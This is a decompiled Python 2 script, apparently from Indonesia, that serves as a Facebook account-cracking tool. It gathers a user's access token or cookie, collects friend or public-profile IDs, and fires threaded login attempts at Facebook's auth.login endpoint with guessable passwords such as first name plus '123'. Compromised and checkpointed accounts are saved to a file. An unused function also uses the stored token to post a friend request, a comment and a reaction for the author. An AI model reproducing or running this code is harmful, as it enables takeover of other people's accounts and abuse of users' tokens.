# Decompiled By RandiSr
# Github : https://github.com/RANDIOLOY
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Jul  8 2020, 22:53:57) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: dg
import os, sys, time, mechanize, itertools, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
my_color = [
 P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 Old.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
os.system('clear')
done = False

def animate():
    for c in itertools.cycle(['\x1b[1;96m|', '\x1b[1;92m/', '\x1b[1;95m-', '\x1b[1;91m\\']):
        if done:
            break
        sys.stdout.write('\rloading ' + c)
        sys.stdout.flush()
        time.sleep(0.01)


t = threading.Thread(target=animate)
t.start()
t = threading.Thread(target=animate)
t.start()
time.sleep(0)
done = True

def keluar():
    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} metu'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


def jalanx(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.005)


logo = ' \x1b[1;96m\xf0\x9f\x91\x87\xf0\x9f\x91\x87\xf0\x9f\x91\x87\xf0\x9f\x91\x87\xf0\x9f\x91\x87\xf0\x9f\x91\x87\xf0\x9f\x91\x87\xf0\x9f\x91\x87 Iki Logo \xf0\x9f\x91\x87\xf0\x9f\x91\x87\xf0\x9f\x91\x87\xf0\x9f\x91\x87\xf0\x9f\x91\x87\xf0\x9f\x91\x87\xf0\x9f\x91\x87\xf0\x9f\x91\x87\n\x1b[1;96m \xf0\x9f\x91\x86\xf0\x9f\x91\x86\xf0\x9f\x91\x86\xf0\x9f\x91\x86\xf0\x9f\x91\x86\xf0\x9f\x91\x86\xf0\x9f\x91\x86\xf0\x9f\x91\x86 Iki Logo \xf0\x9f\x91\x86\xf0\x9f\x91\x86\xf0\x9f\x91\x86\xf0\x9f\x91\x86\xf0\x9f\x91\x86\xf0\x9f\x91\x86\xf0\x9f\x91\x86\xf0\x9f\x91\x86\n\x1b[1;34m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\x1b[1;96m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;34m\xe2\x95\x91  \x1b[1;93mAuthor   \x1b[1;91m: \x1b[1;92mBadru Tr\x1b[1;95micker                 \x1b[1;96m\xe2\x95\x91\n\x1b[1;34m\xe2\x95\x91  \x1b[1;93mGithub   \x1b[1;91m: \x1b[1;92mhttps://\x1b[1;95mgithub.com/Dru-230    \x1b[1;96m\xe2\x95\x91\n\x1b[1;34m\xe2\x95\x91  \x1b[1;93mYT       \x1b[1;91m: \x1b[1;92mBANG\x1b[1;95mBA/DRU \x1b[1;96m\xe2\x95\x91\n\x1b[1;34m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\x1b[1;96m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
logob = '\n\x1b[1;34mSelect Leangue\n'
back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []
username = []
idteman = []
idfromteman = []
boso = []

def plebu():
    os.system('clear')
    print logob
    time.sleep(0.05)
    print '\x1b[1;92m01.\x1b[1;97m Masuk'
    print '\x1b[1;91m00.\x1b[1;97m Keluar'
    pilih_boso()


def pilih_boso():
    sok = raw_input('\x1b[1;92m\xe2\x9e\xa3 \x1b[91m:\x1b[1;92m ')
    if sok == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Isi YG Bener !'
        pilih_boso()
    elif sok == '1' or sok == '01':
        masuk()
    elif sok == '0' or sok == '00':
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Isi YG Bener !'
        pilih_boso()


def masuk():
    os.system('clear')
    jalanx(logo)
    time.sleep(0.05)
    print '\x1b[1;94m============================================='
    time.sleep(0.05)
    print '\x1b[1;92m01.\x1b[1;97m Login Via Token'
    time.sleep(0.05)
    print '\x1b[1;92m02.\x1b[1;97m Login Via Cookies'
    time.sleep(0.05)
    print '\x1b[1;92m03.\x1b[1;97m Totorial Login Token'
    time.sleep(0.05)
    print '\x1b[1;91m00.\x1b[1;97m Exit'
    time.sleep(0.05)
    print '\x1b[1;94m============================================='
    time.sleep(0.05)
    pilih_masuk()


def pilih_masuk():
    msuk = raw_input('\x1b[1;92m\xe2\x9e\xa3 \x1b[91m:\x1b[1;92m ')
    if msuk == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Isi Yg Bener !'
        pilih_masuk()
    elif msuk == '1' or msuk == '01':
        tokenz()
    elif msuk == '2' or msuk == '02':
        cookie()
    elif msuk == '3' or msuk == '03':
        ambil_token()
    elif msuk == '0' or msuk == '00':
        keluar()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Isi YG Bener !'
        pilih_masuk()


def tokenz():
    os.system('clear')
    print logo
    print '\x1b[1;94m============================================='
    toket = raw_input('\x1b[1;97m{\x1b[1;95m?\x1b[1;97m} Token \x1b[1;91m:\x1b[1;92m ')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\x1b[1;97m{\x1b[1;92m\xe2\x9c\x93\x1b[1;97m}\x1b[1;93m Login Berhasil ! '
        jalan('\x1b[1;97mJangan Lupa Subscribe:)')
        os.system('xdg-open https://youtube.com/c/MuhamadBadruOFFCIAL')
        print '\x1b[1;94m============================================='
        menu()
    except KeyError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} \x1b[1;91mToken salah !'
        print '\x1b[1;94m============================================='
        time.sleep(0.01)
        plebu()


def cookie():
    os.system('clear')
    print logo
    print '\x1b[1;94m============================================='
    cookie = raw_input('\x1b[1;97m{\x1b[1;95m?\x1b[1;97m} Cookie \x1b[1;91m:\x1b[1;92m ')
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={' Cookie ': cookie})
        find_token = re.search('(EAAA\\w+)', data.text)
        hasil = '\n* Fail : maybe your cookie invalid !!' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Tidak Ada Sinyal'

    cookie = open('login.txt', 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    print '\x1b[1;97m(\x1b[1;92m\xe2\x9c\x93\x1b[1;97m)\x1b[1;92m Sukses Bro ! '
    print '\x1b[1;94m============================================='
    time.sleep(2)
    menu()
    return


def ambil_token():
    os.system('clear')
    print logo
    print '\x1b[1;94m============================================='
    jalan('        \x1b[1;92mAnda Akan Diarahkan Ke Yutub ...')
    print '\x1b[1;94m============================================='
    os.system('xdg-https://youtube.com/c/MuhamadBadruOFFCIAL')
    time.sleep(0.01)
    masuk()


def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token Wasted'
        os.system('rm -rf login.txt')

    una = '1531729363711410'
    kom = 'MANTAP BANG SCRIPT Nya☺️'
    reac = 'angry'
    post = '2880834122134254'
    post2 = ''
    kom2 = ''
    reac2 = ''
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
    menu()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '{!} Token Wasted !'
        os.system('clear')
        os.system('rm -rf login.txt')
        plebu()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken Wasted'
        os.system('rm -rf login.txt')
        time.sleep(1)
        plebu()
        time.sleep(1)
        plebu()
    except requests.exceptions.ConnectionError:
        print '{!} Tidak Ada Sinyal'
        keluar()

    os.system('clear')
    jalanx(logo)
    print '\x1b[1;94m============================================='
    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m Nama\x1b[1;90m      =>\x1b[1;92m ' + nama
    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m My ID\x1b[1;90m      =>\x1b[1;92m ' + id
    print '\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m}\x1b[1;95m Tanggal Lahir\x1b[1;90m =>\x1b[1;92m  ' + a['birthday']
    time.sleep(0.05)
    print '\x1b[1;94m============================================='
    time.sleep(0.05)
    print '\x1b[1;97m{' + warni + '01\x1b[1;97m}' + warna + ' Crack Id Dari Teman/Publik'
    time.sleep(0.05)
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m}' + warna + ' Exit'
    time.sleep(0.05)
    print '\x1b[1;94m============================================='
    time.sleep(0.05)
    pilih()


def pilih():
    unikers = raw_input('\x1b[1;92m\xe2\x9e\xa3 \x1b[91m:\x1b[1;92m ')
    if unikers == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Yg Bener !'
        pilih()
    elif unikers == '1' or unikers == '01':
        crack_teman()
    elif unikers == '0' or unikers == '00':
        os.system('clear')
        jalan('Mbusek token')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Yg Bener !'
        pilih()


def crack_teman():
    os.system('clear')
    print logo
    time.sleep(0.05)
    print '\x1b[1;94m============================================='
    time.sleep(0.05)
    print '\x1b[1;97m{' + warna + '01\x1b[1;97m}' + warni + ' Crack ID Indonesia'
    time.sleep(0.05)
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m}' + warni + ' kemKembali'
    time.sleep(0.05)
    print '\x1b[1;94m============================================='
    time.sleep(0.05)
    pilih_teman()


def pilih_teman():
    univ = raw_input('\x1b[1;92m\xe2\x9e\xa3 \x1b[91m:\x1b[1;92m ')
    if univ == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Yg Bener !'
        pilih_teman()
    elif univ == '1' or univ == '01':
        crack_indo()
    elif univ == '0' or univ == '00':
        menu()
    else:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Yg Bener !'
        pilih_teman()


def crack_indo():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken Wasted'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    time.sleep(0.05)
    print '\x1b[1;94m============================================='
    time.sleep(0.05)
    print '\x1b[1;97m{\x1b[1;93m01\x1b[1;97m} Crack Dark Daftar Teman'
    time.sleep(0.05)
    print '\x1b[1;97m{\x1b[1;93m02\x1b[1;97m} Crack Dari Publik/Teman'
    time.sleep(0.05)
    print '\x1b[1;97m{\x1b[1;93m03\x1b[1;97m} Crack Dari File'
    time.sleep(0.05)
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Kembalk'
    time.sleep(0.05)
    print '\x1b[1;94m============================================='
    time.sleep(0.05)
    pilih_indo()


def pilih_indo():
    global cekpoint
    global oks
    teak = raw_input('\x1b[1;92m\xe2\x9e\xa3 \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Isi Seng Bener !'
        pilih_indo()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print logo
            print '\x1b[1;94m============================================='
            print '             \x1b[1;97m>>> \x1b[1;92mCRACK INDONESIA \x1b[1;97m<<<'
            print '\x1b[1;94m============================================='
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print logo
            print '\x1b[1;94m============================================='
            print '          \x1b[1;97m>>> \x1b[1;92mCRACK INDONESIA \x1b[1;97m<<<'
            print '\x1b[1;94m============================================='
            idt = raw_input('\x1b[1;97m[\x1b[1;93m>>\x1b[1;97m] \x1b[1;93mID Publik/Teman \x1b[1;91m:\x1b[1;96m ')
            try:
                pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                sp = json.loads(pok.text)
                print '\x1b[1;97m[\x1b[1;93m>>\x1b[1;97m]\x1b[1;93m Teman \x1b[1;91m:\x1b[1;96m ' + sp['name']
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik/Teman !'
                raw_input('\n\x1b[1;93m{\x1b[1;97m>Kembali<\x1b[1;93m}')
                crack_indo()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak Ada Sinyal !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print logo
            try:
                print '\x1b[1;94m============================================='
                print '             \x1b[1;97m>>> \x1b[1;92mCRACK INDONESIA \x1b[1;97m<<<'
                print '\x1b[1;94m============================================='
                idlist = raw_input('\x1b[1;97m{\x1b[1;93m<>\x1b[1;97m} \x1b[1;93mNama File\x1b[1;91m :\x1b[1;92m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File Ora Ono ! '
                raw_input('\n\x1b[1;92m[ \x1b[1;97mKembali \x1b[1;92m]')
            except IOError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File Ora Ono !'
                raw_input('\n\x1b[1;93m{\x1b[1;97m<Kembali>\x1b[1;93m}')
                crack_indo()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Bener !'
            pilih_indo()
        print '\x1b[1;97m{\x1b[1;93m<>\x1b[1;97m} \x1b[1;93mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
        print '\x1b[1;97m{\x1b[1;93m<>\x1b[1;97m} \x1b[1;93mStop CTRL+Z'
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;97m{\x1b[1;93m<>\x1b[1;97m} \x1b[1;93mCrack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;97m\x1b[1;93m\x1b[1;97m\x1b[1;93mGunakan Mode Pesawat 5Detik Bila Tidak Ada Hasil!'
    print '\x1b[1;94m============================================='

    def main(arg):
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = 'sayang'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\x1b[0;92m[OK] ' + zowe + ' > ' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n[OK] ' + zowe + ' > ' + bos1 + '')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\x1b[0;93m[CP] ' + zowe + ' > ' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n[CP] ' + zowe + ' > ' + bos1 + '')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\x1b[0;92m[OK] ' + zowe + ' > ' + bos1
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n[OK] ' + zowe + ' > ' + bos1 + '')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\x1b[0;93m[CP] ' + zowe + ' > ' + bos1
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n[CP] ' + zowe + ' > ' + bos1 + '')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\x1b[0;92m[OK] ' + zowe + ' > ' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n[OK] ' + zowe + ' > ' + bos3 + '')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\x1b[0;93m[CP] ' + zowe + ' > ' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n[CP] ' + zowe + ' > ' + bos3 + '')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'anjing'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\x1b[0;92m[OK] ' + zowe + ' > ' + bos4
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n[OK] ' + zowe + ' > ' + bos4 + '')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\x1b[0;93m[CP] ' + zowe + ' > ' + bos4
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n[CP] ' + zowe + ' > ' + bos4 + '')
                        cek.close()
                        cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m============================================='
    print '\x1b[1;97m[\x1b[1;93m<>\x1b[1;97m] \x1b[1;93mDone BosQuu ...'
    print '\x1b[1;97m[\x1b[1;93m<>\x1b[1;97m] \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;93m<>\x1b[1;97m] \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Tersimpan \x1b[1;91m: \x1b[1;92mdone/indo.txt'
    print '\x1b[1;94m============================================='
    raw_input('\x1b[1;97m[>\x1b[1;93mKemKembali\x1b[1;97m<]')
    os.system('python2 Old.py')


if __name__ == '__main__':
    menu()
    masuk()